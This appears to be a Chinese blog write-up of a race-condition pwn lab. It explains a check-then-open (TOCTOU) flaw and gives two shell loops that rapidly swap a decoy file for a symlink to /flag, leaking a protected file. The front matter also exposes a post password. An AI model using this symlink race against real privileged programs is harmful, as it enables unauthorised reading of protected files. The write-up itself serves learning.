---
title: 关于条件竞争的一道pwn题
top: 33
tags:
  - 条件竞争
  - lab
categories: 私房菜
password: he13716649461
abbrlink: e0e031bd
---

通过本题的学习，对了条件竞争有了初步的了解与认识。

条件竞争中，首先一定要是多线程的，对同一个共享资源(文件，全局变量等等)来进行操作。

### 程序功能及描述：

本题的伪代码及分析如下：

![image-20221113205400509](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211132054742.png)

![image-20221113205603112](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211132056198.png)

总结下这道题的目的和功能：

功能：运行本程序，传入一个文件名(命令行参数)。只要该文件名不是/flag(程序原本是/proc/flag的路径，我patch了一下，将其字符串改为了/flag)，就打印其中的内容。

目的：在本地测试时，我们拥有shell权限，可以执行任何命令，我们需要想办法通过这个程序来泄露/flag中的内容。

本题中条件竞争主要体现在条件分支上的一个竞争，先进行一个操作，让条件分支过这个判断，然后紧跟以很快的速度去进行第二个操作(从而完成泄露文件中的内容)



### 利用思路：

我们先去创建一个名为fake的文件(与内容无关)，假设程序此时运行过了此处的检查(如下)

![image-20221113220415841](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211132204906.png)

然后将去读出fake文件中的数据，而此时如果我们去删掉fake文件，并且创建一个/flag文件的软链接名为fake(如果我们完成这一系列操作速度够快的话)，那么此时fopen会打开这个fake文件，而此时这个fake文件就是/flag的软链接，最后从而打印出来/flag文件中的内容。



注意：由于获取的是绝对路径，因此我们直接创建/flag文件的软链接为fake的话，在拿到绝对路径后依然是/flag，所以这样是不会通过检查的。



而上面提到的一系列操作必须要速度够快，这就意味着速度不快的话就不会成功，所以这里要多次循环尝试一下，同时还需要同时运行程序和运行脚本。

### EXP：

于是我们准备两个shell脚本如下:

```shell
for i in `seq 5000`
do
    /home/zikh/Desktop/a fake
done
```

```shell
for i in `seq 5000`
do
    touch fake
    sleep 0.000001
    rm fake
    ln -s /flag fake
    sleep 0.000001
    rm fake
done
```

分别命名为  exp.sh ln.sh

最后我们执行`(sh exp.sh &) && sh ln.sh `   可以将这条命令理解为同时执行exp.sh和ln.sh两个文件，最终触发条件竞争，来成功读出了flag

![image-20221113222651514](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211132226102.png)

### 题目链接：

链接: https://pan.baidu.com/s/1dvWlQXTdOvfGqcgFtfr_uQ?pwd=qudp 提取码: qudp 
